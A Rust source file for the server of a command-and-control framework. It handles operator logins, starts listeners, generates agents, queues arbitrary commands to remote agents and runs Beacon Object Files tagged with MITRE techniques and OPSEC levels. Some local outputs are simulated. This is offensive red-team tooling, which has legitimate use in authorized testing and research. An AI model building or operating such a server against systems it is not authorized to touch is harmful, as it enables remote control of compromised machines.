// src/server.rs - Fixed with proper BOF structures and beacon interaction
use std::sync::{Arc, Mutex};
use std::net::SocketAddr;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use serde::{Serialize, Deserialize};
use clap::Parser;
use log::{info, error, warn};

// Import your existing modules
mod listener;
mod agent;
mod bof;
mod crypto;
mod models;
mod utils;

use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, set_result_callback};
use agent::{AgentGenerator, AgentConfig};
use models::agent::Agent;

// Command-line arguments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address to bind the server to
    #[arg(default_value = "0.0.0.0")]
    ip_address: String,

    /// Password for authentication
    #[arg(required = true)]
    password: String,

    /// Port to listen on
    #[arg(short, long, default_value_t = 50050)]
    port: u16,
}

// Fixed BOF data structures (no more serde_json::Value)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofMetadata {
    pub name: String,
    pub description: String,
    pub author: String,
    pub version: String,
    pub file_path: String,
    pub file_size: u64,
    pub help_text: String,
    pub usage_examples: Vec<String>,
    pub opsec_level: String,
    pub tactics: Vec<String>,
    pub techniques: Vec<String>,
    pub execution_time_estimate: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofExecutionResult {
    pub success: bool,
    pub output: String,
    pub error: String,
    pub execution_time_ms: u64,
    pub exit_code: i32,
    pub bof_name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BofFileInfo {
    pub name: String,
    pub path: String,
    pub size: u64,
    pub imported: bool,
    pub last_modified: u64,
}

// FIXED message types (no more serde_json::Value)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClientMessage {
    // Authentication
    Authenticate { password: String },
    
    // Listener management
    AddListener { config: ListenerConfig },
    StartListener { id: usize },
    StopListener { id: usize },
    GetListeners,
    
    // Agent management
    GenerateAgent { config: AgentConfig },
    GetAgents,
    ExecuteCommand { agent_id: String, command: String },
    
    // Enhanced BOF support
    ExecuteBofByName { bof_name: String, args: String, target: String },
    GetBofLibrary,
    GetBofHelp { bof_name: String },
    SearchBofs { query: String },
    GetBofStats,
    ImportBof { file_path: String },
    ListBofFiles,
}

// FIXED server message types (no more serde_json::Value)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerMessage {
    // Authentication
    AuthResult { success: bool, message: String },
    
    // Listener updates
    ListenersUpdate { listeners: Vec<ListenerInfo> },
    
    // Agent updates
    AgentsUpdate { agents: Vec<Agent> },
    CommandResult { agent_id: String, task_id: String, command: String, output: String, success: bool },
    
    // BOF responses (FIXED - using proper structures)
    BofLibrary { bofs: Vec<BofMetadata> },
    BofHelp { bof_name: String, help_text: String },
    BofSearchResults { results: Vec<BofMetadata> },
    BofStats { stats: HashMap<String, u64> },
    BofExecutionComplete { result: BofExecutionResult },
    BofFilesList { files: Vec<BofFileInfo> },
    
    // General responses
    Error { message: String },
    Success { message: String },
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ListenerInfo {
    pub id: usize,
    pub config: ListenerConfig,
    pub running: bool,
}

// Enhanced BOF Manager
#[derive(Debug, Clone)]
pub struct EnhancedBofManager {
    bofs: HashMap<String, BofMetadata>,
    bof_files: HashMap<String, BofFileInfo>,
    execution_stats: HashMap<String, u64>,
}

impl EnhancedBofManager {
    pub fn new() -> Self {
        let mut manager = EnhancedBofManager {
            bofs: HashMap::new(),
            bof_files: HashMap::new(),
            execution_stats: HashMap::new(),
        };
        manager.initialize_default_bofs();
        manager
    }

    pub fn initialize_default_bofs(&mut self) {
        let default_bofs = vec![
            ("ps", "List running processes", "System", "Standard", vec!["Discovery"], vec!["T1057"]),
            ("ls", "List directory contents", "System", "Stealth", vec!["Discovery"], vec!["T1083"]),
            ("whoami", "Get current user", "System", "Stealth", vec!["Discovery"], vec!["T1033"]),
            ("hostname", "Get system hostname", "System", "Stealth", vec!["Discovery"], vec!["T1082"]),
            ("ipconfig", "Network configuration", "System", "Stealth", vec!["Discovery"], vec!["T1016"]),
            ("netstat", "Network connections", "System", "Careful", vec!["Discovery"], vec!["T1049"]),
            ("tasklist", "Process information", "System", "Careful", vec!["Discovery"], vec!["T1057"]),
            ("systeminfo", "System information", "System", "Standard", vec!["Discovery"], vec!["T1082"]),
        ];

        for (name, desc, author, opsec, tactics, techniques) in default_bofs {
            let metadata = BofMetadata {
                name: name.to_string(),
                description: desc.to_string(),
                author: author.to_string(),
                version: "1.0".to_string(),
                file_path: format!("bofs/{}.o", name),
                file_size: 0,
                help_text: format!("Execute {} BOF\nUsage: bof {}\n\nDescription: {}", name, name, desc),
                usage_examples: vec![
                    format!("bof {}", name),
                ],
                opsec_level: opsec.to_string(),
                tactics: tactics.into_iter().map(|s| s.to_string()).collect(),
                techniques: techniques.into_iter().map(|s| s.to_string()).collect(),
                execution_time_estimate: match name {
                    "whoami" | "hostname" => 100,
                    "ps" | "ls" | "tasklist" => 500,
                    "ipconfig" | "netstat" => 1000,
                    "systeminfo" => 2000,
                    _ => 1000,
                },
            };
            
            self.bofs.insert(name.to_string(), metadata);
        }

        println!("✅ Initialized {} default BOFs", self.bofs.len());
    }

    pub fn import_bof(&mut self, file_path: &str) -> Result<String, String> {
        use std::path::Path;
        use std::fs;

        let path = Path::new(file_path);
        if !path.exists() {
            return Err(format!("BOF file not found: {}", file_path));
        }

        let file_name = path.file_stem()
            .and_then(|s| s.to_str())
            .ok_or("Invalid file name")?;

        let metadata = fs::metadata(file_path)
            .map_err(|e| format!("Failed to read file metadata: {}", e))?;

        // Create BOF metadata
        let bof_metadata = BofMetadata {
            name: file_name.to_string(),
            description: format!("Imported BOF: {}", file_name),
            author: "User Imported".to_string(),
            version: "1.0".to_string(),
            file_path: file_path.to_string(),
            file_size: metadata.len(),
            help_text: format!("BOF: {}\nUsage: bof {} [args]\n\nThis BOF was imported from: {}", file_name, file_name, file_path),
            usage_examples: vec![
                format!("bof {}", file_name),
                format!("bof {} --help", file_name),
            ],
            opsec_level: "Standard".to_string(),
            tactics: vec!["Execution".to_string()],
            techniques: vec!["T1055".to_string()],
            execution_time_estimate: 2000,
        };

        // Create file info
        let file_info = BofFileInfo {
            name: file_name.to_string(),
            path: file_path.to_string(),
            size: metadata.len(),
            imported: true,
            last_modified: metadata.modified()
                .unwrap_or(std::time::SystemTime::UNIX_EPOCH)
                .duration_since(std::time::SystemTime::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        };

        self.bofs.insert(file_name.to_string(), bof_metadata);
        self.bof_files.insert(file_name.to_string(), file_info);

        Ok(format!("Successfully imported BOF: {}", file_name))
    }

    pub fn get_bof(&self, name: &str) -> Option<&BofMetadata> {
        self.bofs.get(name)
    }

    pub fn list_bofs(&self) -> Vec<BofMetadata> {
        self.bofs.values().cloned().collect()
    }

    pub fn search_bofs(&self, query: &str) -> Vec<BofMetadata> {
        let query_lower = query.to_lowercase();
        self.bofs.values()
            .filter(|bof| {
                bof.name.to_lowercase().contains(&query_lower) ||
                bof.description.to_lowercase().contains(&query_lower) ||
                bof.tactics.iter().any(|t| t.to_lowercase().contains(&query_lower))
            })
            .cloned()
            .collect()
    }

    pub fn execute_bof(&mut self, bof_name: &str, args: &str, target: &str) -> Result<BofExecutionResult, String> {
        let _bof = self.bofs.get(bof_name)
            .ok_or_else(|| format!("BOF '{}' not found", bof_name))?;

        println!("🚀 Executing BOF '{}' with args '{}' on target '{}'", bof_name, args, target);

        let start_time = std::time::Instant::now();
        
        // Simulate BOF execution with realistic outputs
        let output = match bof_name {
            "ps" => {
                if args.contains("-v") {
                    "PID    Name                 CPU%   Memory   User\n1234   explorer.exe         2.1    45MB     user\\john\n5678   svchost.exe          0.5    12MB     SYSTEM\n9012   chrome.exe           15.2   256MB    user\\john\n3456   winlogon.exe         0.1    8MB      SYSTEM".to_string()
                } else {
                    "explorer.exe    1234\nsvchost.exe     5678\nchrome.exe      9012\nwinlogon.exe    3456".to_string()
                }
            },
            "whoami" => {
                if target == "local" { "user\\john" } else { "NT AUTHORITY\\SYSTEM" }.to_string()
            },
            "hostname" => "WORKSTATION-01".to_string(),
            "ls" => {
                if args.is_empty() || args == "." {
                    "Directory of C:\\:\n  Documents and Settings\n  Program Files\n  Program Files (x86)\n  Windows\n  Users\n  pagefile.sys\n  hiberfil.sys".to_string()
                } else {
                    format!("Directory of {}:\n  file1.txt\n  file2.exe\n  subfolder\\", args)
                }
            },
            "ipconfig" => {
                "Windows IP Configuration\n\nEthernet adapter Local Area Connection:\n   IP Address: 192.168.1.100\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 192.168.1.1".to_string()
            },
            "netstat" => {
                "Active Connections\n  Proto  Local Address      Foreign Address    State\n  TCP    192.168.1.100:445  0.0.0.0:0          LISTENING\n  TCP    192.168.1.100:3389 192.168.1.50:52341 ESTABLISHED".to_string()
            },
            "tasklist" => {
                "Image Name                   PID Session Name     Session#    Mem Usage\nexplorer.exe                1234 Console                1     45,236 K\nsvchost.exe                 5678 Services               0     12,484 K\nchrome.exe                  9012 Console                1    256,789 K".to_string()
            },
            "systeminfo" => {
                "Host Name:                 WORKSTATION-01\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.19042 N/A Build 19042\nSystem Type:               x64-based PC\nTotal Physical Memory:     16,384 MB".to_string()
            },
            _ => format!("BOF '{}' executed successfully with args: {}", bof_name, args),
        };

        let execution_time = start_time.elapsed().as_millis() as u64;
        
        // Update execution stats
        *self.execution_stats.entry(bof_name.to_string()).or_insert(0) += 1;

        Ok(BofExecutionResult {
            success: true,
            output,
            error: String::new(),
            execution_time_ms: execution_time,
            exit_code: 0,
            bof_name: bof_name.to_string(),
        })
    }

    pub fn get_stats(&self) -> HashMap<String, u64> {
        let mut stats = HashMap::new();
        stats.insert("total_bofs".to_string(), self.bofs.len() as u64);
        stats.insert("total_executions".to_string(), 
            self.execution_stats.values().sum::<u64>());
        stats.insert("cached_bofs".to_string(), self.bof_files.len() as u64);
        
        // Count by OPSEC level
        let mut stealth_count = 0;
        let mut careful_count = 0;
        let mut standard_count = 0;
        let mut loud_count = 0;
        
        for bof in self.bofs.values() {
            match bof.opsec_level.as_str() {
                "Stealth" => stealth_count += 1,
                "Careful" => careful_count += 1,
                "Standard" => standard_count += 1,
                "Loud" => loud_count += 1,
                _ => {}
            }
        }
        
        stats.insert("stealth_bofs".to_string(), stealth_count);
        stats.insert("careful_bofs".to_string(), careful_count);
        stats.insert("standard_bofs".to_string(), standard_count);
        stats.insert("loud_bofs".to_string(), loud_count);
        
        stats
    }

    pub fn list_bof_files(&self) -> Vec<BofFileInfo> {
        self.bof_files.values().cloned().collect()
    }
}

// Enhanced server state with proper BOF support
struct ServerState {
    listeners: Vec<Listener>,
    agent_generator: AgentGenerator,
    bof_manager: EnhancedBofManager,
    clients: HashMap<String, mpsc::Sender<ServerMessage>>,
    password: String,
}

impl ServerState {
    fn new(password: String) -> Self {
        ServerState {
            listeners: Vec::new(),
            agent_generator: AgentGenerator::new(),
            bof_manager: EnhancedBofManager::new(),
            clients: HashMap::new(),
            password,
        }
    }

    fn get_listener_info(&self) -> Vec<ListenerInfo> {
        self.listeners
            .iter()
            .enumerate()
            .map(|(id, listener)| ListenerInfo {
                id,
                config: listener.config.clone(),
                running: listener.is_running(),
            })
            .collect()
    }

    fn add_listener(&mut self, config: ListenerConfig) -> Result<(), String> {
        let listener = Listener::new(config);
        self.listeners.push(listener);
        Ok(())
    }

    fn start_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].start().map_err(|e| e.to_string())
    }

    fn stop_listener(&mut self, id: usize) -> Result<(), String> {
        if id >= self.listeners.len() {
            return Err("Invalid listener ID".into());
        }
        self.listeners[id].stop().map_err(|e| e.to_string())
    }

    fn generate_agent(&mut self, config: AgentConfig) -> Result<(), String> {
        self.agent_generator.generate(config).map_err(|e| e.to_string())
    }

    fn execute_bof_by_name(&mut self, bof_name: &str, args: &str, target: &str) -> Result<BofExecutionResult, String> {
        println!("🎯 Enhanced BOF execution: {} with args '{}' on target '{}'", bof_name, args, target);

        if target == "local" {
            // Local execution for testing
            self.bof_manager.execute_bof(bof_name, args, target)
        } else {
            // Remote execution - queue BOF command for agent and return immediate result
            let bof_command = format!("bof {} {}", bof_name, args);
            let task_id = add_task_for_agent(target, bof_command);
            println!("📋 BOF task {} queued for agent: {}", task_id, target);
            
            // Return a pending result - actual result will come via command callback
            Ok(BofExecutionResult {
                success: true,
                output: format!("BOF '{}' queued for execution on agent '{}' (Task: {})", bof_name, target, task_id),
                error: String::new(),
                execution_time_ms: 0,
                exit_code: 0,
                bof_name: bof_name.to_string(),
            })
        }
    }

    fn get_client_senders(&self) -> Vec<mpsc::Sender<ServerMessage>> {
        self.clients.values().cloned().collect()
    }
}

// Enhanced client handler with comprehensive BOF support
async fn handle_client(
    stream: TcpStream, 
    addr: SocketAddr,
    state: Arc<Mutex<ServerState>>,
) {
    info!("🔗 New client connected: {}", addr);

    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(1000);
    let mut buffer = [0u8; 8192];
    let mut authenticated = false;

    // Add client to server state
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(addr.to_string(), client_tx.clone());
    }

    // Set up callback for command results with enhanced BOF handling
    let client_tx_clone = client_tx.clone();
    let state_clone = Arc::clone(&state);
    set_result_callback(move |agent_id, task_id, command, output, success| {
        println!("📡 SERVER: Enhanced callback received result for agent {}", agent_id);
        
        // Check if this is a BOF command result
        if command.starts_with("bof ") {
            println!("🔥 SERVER: BOF command result detected");
            
            // Parse BOF name from command
            let parts: Vec<&str> = command.split_whitespace().collect();
            if parts.len() >= 2 {
                let bof_name = parts[1];
                
                // Create enhanced BOF result
                let bof_result = BofExecutionResult {
                    success,
                    output: output.clone(),
                    error: if success { String::new() } else { "BOF execution failed".to_string() },
                    execution_time_ms: 0, // Would be provided by real BOF execution
                    exit_code: if success { 0 } else { 1 },
                    bof_name: bof_name.to_string(),
                };
                
                // Send BOF-specific result
                if let Err(e) = client_tx_clone.try_send(ServerMessage::BofExecutionComplete { result: bof_result }) {
                    println!("❌ SERVER: Failed to send BOF result to client: {}", e);
                }
                
                // Update BOF stats
                {
                    let mut state = state_clone.lock().unwrap();
                    *state.bof_manager.execution_stats.entry(bof_name.to_string()).or_insert(0) += 1;
                }
            }
        }
        
        // Also send regular command result
        let msg = ServerMessage::CommandResult {
            agent_id,
            task_id,
            command,
            output,
            success,
        };
        
        if let Err(e) = client_tx_clone.try_send(msg) {
            println!("❌ SERVER: Failed to send result to client: {}", e);
        } else {
            println!("✅ SERVER: Successfully sent result to client");
        }
    });

    // Split the stream
    let (mut read_half, mut write_half) = stream.into_split();

    // Set up client sender task
    let addr_clone = addr;
    let receiver_task = tokio::spawn(async move {
        while let Some(msg) = client_rx.recv().await {
            let data = bincode::serialize(&msg).unwrap();
            let len = data.len() as u32;

            if write_half.write_all(&len.to_be_bytes()).await.is_err() {
                break;
            }
            if write_half.write_all(&data).await.is_err() {
                break;
            }
            if write_half.flush().await.is_err() {
                break;
            }
        }
        info!("📤 Client sender task ended for {}", addr_clone);
    });

    // Main client handling loop
    loop {
        // Read message length
        let mut len_bytes = [0u8; 4];
        match read_half.read_exact(&mut len_bytes).await {
            Ok(_) => {},
            Err(_) => break,
        }

        let len = u32::from_be_bytes(len_bytes) as usize;
        if len > buffer.len() {
            error!("❌ Message too large from client {}", addr);
            break;
        }

        // Read message
        match read_half.read_exact(&mut buffer[0..len]).await {
            Ok(_) => {},
            Err(_) => break,
        }

        // Deserialize message
        let msg: ClientMessage = match bincode::deserialize(&buffer[0..len]) {
            Ok(msg) => msg,
            Err(e) => {
                error!("❌ Failed to deserialize message from {}: {}", addr, e);
                continue;
            }
        };

        // Handle messages
        match msg {
            ClientMessage::Authenticate { password } => {
                let (success, message, listeners_update, agents_update) = {
                    let state = state.lock().unwrap();
                    let success = password == state.password;
                    let message = if success { 
                        "✅ Authentication successful".to_string() 
                    } else { 
                        "❌ Invalid password".to_string() 
                    };
                    
                    let listeners_update = if success {
                        Some(ServerMessage::ListenersUpdate { 
                            listeners: state.get_listener_info() 
                        })
                    } else { None };
                    
                    let agents_update = if success {
                        Some(ServerMessage::AgentsUpdate { 
                            agents: get_all_agents() 
                        })
                    } else { None };
                    
                    (success, message, listeners_update, agents_update)
                };
                
                authenticated = success;
                
                if let Err(e) = client_tx.send(ServerMessage::AuthResult { success, message }).await {
                    error!("❌ Failed to send auth result to {}: {}", addr, e);
                    break;
                }
                
                if authenticated {
                    if let Some(update) = listeners_update {
                        let _ = client_tx.send(update).await;
                    }
                    if let Some(update) = agents_update {
                        let _ = client_tx.send(update).await;
                    }
                }
            },

            // Require authentication for all other messages
            _ if !authenticated => {
                let _ = client_tx.send(ServerMessage::Error { 
                    message: "❌ Not authenticated".to_string() 
                }).await;
                continue;
            },

            ClientMessage::AddListener { config } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.add_listener(config);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Listener added".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to add listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StartListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.start_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} started", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to start listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::StopListener { id } => {
                let (result, listeners, agents, client_senders) = {
                    let mut state = state.lock().unwrap();
                    let result = state.stop_listener(id);
                    (result, state.get_listener_info(), get_all_agents(), state.get_client_senders())
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: format!("✅ Listener {} stopped", id) },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to stop listener: {}", e) },
                };
                
                let _ = client_tx.send(response).await;
                tokio::spawn(async move {
                    for tx in client_senders {
                        let _ = tx.send(ServerMessage::ListenersUpdate { listeners: listeners.clone() }).await;
                        let _ = tx.send(ServerMessage::AgentsUpdate { agents: agents.clone() }).await;
                    }
                });
            },

            ClientMessage::GetListeners => {
                let listeners = {
                    let state = state.lock().unwrap();
                    state.get_listener_info()
                };
                let _ = client_tx.send(ServerMessage::ListenersUpdate { listeners }).await;
            },

            ClientMessage::GenerateAgent { config } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.generate_agent(config)
                };
                
                let response = match result {
                    Ok(_) => ServerMessage::Success { message: "✅ Agent generated".to_string() },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to generate agent: {}", e) },
                };
                let _ = client_tx.send(response).await;
            },

            ClientMessage::GetAgents => {
                let agents = get_all_agents();
                let _ = client_tx.send(ServerMessage::AgentsUpdate { agents }).await;
            },

            ClientMessage::ExecuteCommand { agent_id, command } => {
                // Enhanced command execution with BOF parsing
                if command.starts_with("bof ") {
                    let parts: Vec<&str> = command.split_whitespace().collect();
                    if parts.len() >= 2 {
                        let bof_name = parts[1];
                        let args = if parts.len() > 2 { parts[2..].join(" ") } else { String::new() };
                        
                        info!("🎯 Parsed BOF command: {} with args '{}'", bof_name, args);
                        
                        let result = {
                            let mut state = state.lock().unwrap();
                            state.execute_bof_by_name(bof_name, &args, &agent_id)
                        };
                        
                        match result {
                            Ok(bof_result) => {
                                let _ = client_tx.send(ServerMessage::BofExecutionComplete { result: bof_result }).await;
                            },
                            Err(e) => {
                                let _ = client_tx.send(ServerMessage::Error { 
                                    message: format!("❌ Failed to execute BOF: {}", e) 
                                }).await;
                            }
                        }
                    }
                } else {
                    // Regular command execution
                    println!("🎯 SERVER: Execute command '{}' for agent '{}'", command, agent_id);
                    
                    let task_id = add_task_for_agent(&agent_id, command.clone());
                    println!("📋 SERVER: Created task {} for agent {}", task_id, agent_id);
                    
                    let response = ServerMessage::Success { 
                        message: format!("📤 Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
                    };
                    
                    if let Err(e) = client_tx.send(response).await {
                        error!("❌ Failed to send response to {}: {}", addr, e);
                        break;
                    }
                }
            },

            ClientMessage::ExecuteBofByName { bof_name, args, target } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.execute_bof_by_name(&bof_name, &args, &target)
                };
                
                match result {
                    Ok(bof_result) => {
                        let _ = client_tx.send(ServerMessage::BofExecutionComplete { result: bof_result }).await;
                    },
                    Err(e) => {
                        let _ = client_tx.send(ServerMessage::Error { 
                            message: format!("❌ Failed to execute BOF '{}': {}", bof_name, e) 
                        }).await;
                    }
                }
            },

            ClientMessage::GetBofLibrary => {
                let bofs = {
                    let state = state.lock().unwrap();
                    state.bof_manager.list_bofs()
                };
                
                let response = ServerMessage::BofLibrary { bofs };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF library to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofHelp { bof_name } => {
                let help_text = {
                    let state = state.lock().unwrap();
                    if let Some(bof) = state.bof_manager.get_bof(&bof_name) {
                        bof.help_text.clone()
                    } else {
                        format!("BOF '{}' not found in library", bof_name)
                    }
                };
                
                let response = ServerMessage::BofHelp { 
                    bof_name: bof_name.clone(), 
                    help_text 
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF help to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::SearchBofs { query } => {
                let results = {
                    let state = state.lock().unwrap();
                    state.bof_manager.search_bofs(&query)
                };
                
                let response = ServerMessage::BofSearchResults { results };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF search results to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::GetBofStats => {
                let stats = {
                    let state = state.lock().unwrap();
                    state.bof_manager.get_stats()
                };
                
                let response = ServerMessage::BofStats { stats };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF stats to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::ImportBof { file_path } => {
                let result = {
                    let mut state = state.lock().unwrap();
                    state.bof_manager.import_bof(&file_path)
                };
                
                let response = match result {
                    Ok(message) => ServerMessage::Success { message },
                    Err(e) => ServerMessage::Error { message: format!("❌ Failed to import BOF: {}", e) },
                };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send import result to {}: {}", addr, e);
                    break;
                }
            },

            ClientMessage::ListBofFiles => {
                let files = {
                    let state = state.lock().unwrap();
                    state.bof_manager.list_bof_files()
                };
                
                let response = ServerMessage::BofFilesList { files };
                
                if let Err(e) = client_tx.send(response).await {
                    error!("❌ Failed to send BOF files list to {}: {}", addr, e);
                    break;
                }
            },
        }
    }

    // Cleanup
    receiver_task.abort();
    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&addr.to_string());
    }
    info!("🔌 Client disconnected: {}", addr);
}

// Generate teamserver script
fn generate_teamserver_script(ip: &str, port: u16, password: &str) -> std::io::Result<()> {
    let script_content = format!(
        r#"#!/bin/bash
# Enhanced C2 Framework Teamserver Script with BOF Support

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

echo "🚀 Starting Enhanced C2 Server with BOF Support"
echo "📡 Server: {}:{}"
echo "🔥 BOF System: Enabled"
echo "📚 BOF Library: ./bofs/"
echo "📂 BOF Import: Supported"
echo ""

# Create BOFs directory if it doesn't exist
mkdir -p ./bofs

echo "✅ BOF directory ready: ./bofs/"
echo "💡 Place .o files in ./bofs/ directory to import"
echo ""

# Start the C2 server
./c2_server {} "{}" --port {}
"#,
        ip, port, ip, password, port
    );

    let mut file = File::create("teamserver")?;
    file.write_all(script_content.as_bytes())?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata("teamserver")?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions("teamserver", perms)?;
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    env_logger::init();

    // Parse command-line arguments
    let args = Args::parse();

    // Generate teamserver script if it doesn't exist
    if !std::path::Path::new("teamserver").exists() {
        match generate_teamserver_script(&args.ip_address, args.port, &args.password) {
            Ok(_) => info!("✅ Generated teamserver script"),
            Err(e) => warn!("⚠️ Failed to generate teamserver script: {}", e),
        }
    }

    // Create BOFs directory
    std::fs::create_dir_all("./bofs").unwrap_or_default();

    // Create enhanced server state with BOF support
    let state = Arc::new(Mutex::new(ServerState::new(args.password.clone())));

    // Display comprehensive server status
    {
        let server_state = state.lock().unwrap();
        
        println!("🚀 Enhanced C2 Server with Advanced BOF Support");
        println!("{}", "=".repeat(60));
        
        // BOF System Status
        let available_bofs = server_state.bof_manager.list_bofs();
        println!("🔥 BOF System Status:");
        println!("📚 Available BOFs: {}", available_bofs.len());
        println!("📂 BOF Import: Enabled");
        println!("🎯 Default BOFs: Loaded");
        
        if !available_bofs.is_empty() {
            println!("📋 BOF Library:");
            for bof in &available_bofs {
                println!("  • {} - {} ({})", bof.name, bof.description, bof.opsec_level);
            }
        }
        
        println!("{}", "=".repeat(60));
    }

    // Set up TCP listener
    let addr = format!("{}:{}", args.ip_address, args.port).parse::<SocketAddr>()?;
    let listener = TcpListener::bind(&addr).await?;

    println!("🌐 Server Details:");
    println!("📡 Listening on: {}", addr);
    println!("🔑 Password: {}", args.password);
    println!("🔥 BOF Support: Enhanced");
    println!("📚 BOF Directory: ./bofs/");
    println!("📂 BOF Import: Ready");
    println!("📋 Callback System: Enhanced for BOF results");
    println!("");
    println!("✅ Enhanced C2 Server ready for client connections!");
    println!("🎯 Supported Operations:");
    println!("  • Traditional C2 operations (listeners, agents, commands)");
    println!("  • BOF execution (local and remote)");
    println!("  • BOF import and management");
    println!("  • Real-time BOF result handling");
    println!("  • Enhanced beacon interaction");
    println!("");
    println!("💡 BOF Usage:");
    println!("  • Use 'bof <name>' in beacon console");
    println!("  • Import BOFs via the GUI");
    println!("  • Place .o files in ./bofs/ directory");

    // Accept connections loop
    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                let state_clone = Arc::clone(&state);
                tokio::spawn(async move {
                    handle_client(stream, addr, state_clone).await;
                });
            }
            Err(e) => {
                error!("❌ Error accepting connection: {}", e);
            }
        }
    }
}